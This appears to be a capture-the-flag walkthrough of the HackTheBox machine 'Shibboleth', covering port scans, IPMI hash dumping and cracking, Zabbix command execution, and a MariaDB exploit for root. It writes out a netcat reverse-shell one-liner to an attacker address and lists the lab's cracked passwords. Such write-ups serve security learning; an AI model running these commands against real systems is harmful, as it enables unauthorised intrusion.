# HackTheBox-Shibboleth

## NMAP

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

```

## PORT 80 (HTTP)

On the web server we see a html template page

<img src="https://i.imgur.com/LxFp6HZ.png"/>


We can check the source which reveals that it's a theme so no point in enumerating here, from the nmap scan it did show us that it was redirecting to a domain name so let's try to run `wfuzz` to bruteforce for subdomains

<img src="https://i.imgur.com/rCXO6ci.png"/>

Here it gives us there names, and these all are the same

<img src="https://i.imgur.com/1WphEt4.png"/>

If we hover over the `help` link , it will show us that it's using version 5 of `zabbix` , which is a tool for monitoring the network and ,virtual machines and other services running. Searching for exploits was a rabbit hole here as it was reported that zabbix 5.x is vulnerable to blind sqli but there wasn't any exploits publicily available.

I went back to scanning the machine and scanend for `UDP` ports

```bash
nmap -p 1-1000 -sU --min-rate 5000 10.129.231.205 -vv                                                                           
PORT    STATE  SERVICE   REASON                      
45/udp  closed mpm       port-unreach ttl 63                     
179/udp closed bgp       port-unreach ttl 63                     
243/udp closed sur-meas  port-unreach ttl 63
422/udp closed ariel3    port-unreach ttl 63
459/udp closed ampr-rcmd port-unreach ttl 63
623/udp open   asf-rmcp  udp-response ttl 63
892/udp closed unknown   port-unreach ttl 63
```

This showed port 623 which was opened and was running `IPMI` Intelligent Platform Management Interface , which is used for controlling and managing hardware services. There was a metasploit module available that can dump `HMAC-SHA1` hashes, so using the module `use auxiliary/scanner/ipmi/ipmi_dumphashes`

<img src="https://i.imgur.com/uCJ24YR.png"/>

And we can now crack this hash using `hashcat`

<img src="https://i.imgur.com/fRS1yY0.png"/>

<img src="https://i.imgur.com/cTsv8KO.png"/>

<img src="https://i.imgur.com/VHh7xuX.png"/>

<img src="https://i.imgur.com/HKydYHb.png"/>

## Foothold

To get a foolthold , we can run shell commands through Zabbix agent, in order to do this first we'll need to go to `Configuration` and select `Hosts`

<img src="https://i.imgur.com/N46Tsyf.png"/>

Next select the hostname ,which is `shibboleth.htb` , after selecting the hostname , navigate to `items`

<img src="https://i.imgur.com/Ali3PbM.png"/>
 
Click on create `new item`

<img src="https://i.imgur.com/n4W1l1z.png"/>

When adding a new item , in the `key` field to run command we need to input `system.run["shell command"]` also change type of information to `text`

<img src="https://i.imgur.com/zcJbGKP.png"/>

At the bottom , we can see a button `Test` to check our command

<img src="https://i.imgur.com/eVO2Zmt.png"/>

<img src="https://i.imgur.com/FMZfgps.png"/>

So we have command execution here , now we need to get a reverse shell from here

```bash
system.run["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 2222 >/tmp/f",nowait]
```

We are specifying `nowait` here so it does not close the process

<img src="https://i.imgur.com/a0MB63M.png"/>

<img src="https://i.imgur.com/IySoHj3.png"/>

Stabilizing the reverse shell so we may have a tty shell

<img src="https://i.imgur.com/2NUGe3Y.png"/>

## Privilege Escalation (ipmi-svc)

I ran `sudo -l` to see if there was any thing this user can run as a different user or as root but we need a password , I tried the zabbix admin password but it failed

<img src="https://i.imgur.com/JNr2x00.png"/>

We can see another user named `ipmi-svc` , let's try the password that we found for this user

<img src="https://i.imgur.com/vGX3SOD.png"/>

And this worked , we can find the database creds from `/etc/zabbix/zabbix_server.conf`

<img src="https://i.imgur.com/LPIrLf5.png"/>
## Privilege Escalation (root)

After logging in with mysql , it was using `Mariadb` which was using `10.3.25` version, so I searched for if there was any exploit for this version and it returned with a command execution exploit 

<img src="https://i.imgur.com/bMsacsq.png"/>

So first we have to generate  a shared library file which can be used in any program at run time , transfer that on the target machine

<img src="https://i.imgur.com/1p9NQOh.png"/>

Start the netcat listener , and login in with mysql user by executing a command 

<img src="https://i.imgur.com/ddTsWXZ.png"/>

## References

- https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
- https://hashcat.net/wiki/doku.php?id=example_hashes
- https://subscription.packtpub.com/book/cloud-and-networking/9781800202238/2/ch02lvl1sec20/using-zabbix-preprocessing-to-alter-item-values
- https://www.zabbix.com/forum/zabbix-help/21803-system-run-syntax
- https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html
- 
```
Administrator:ilovepumkinpie1
zabbix:bloooarskybluh
```
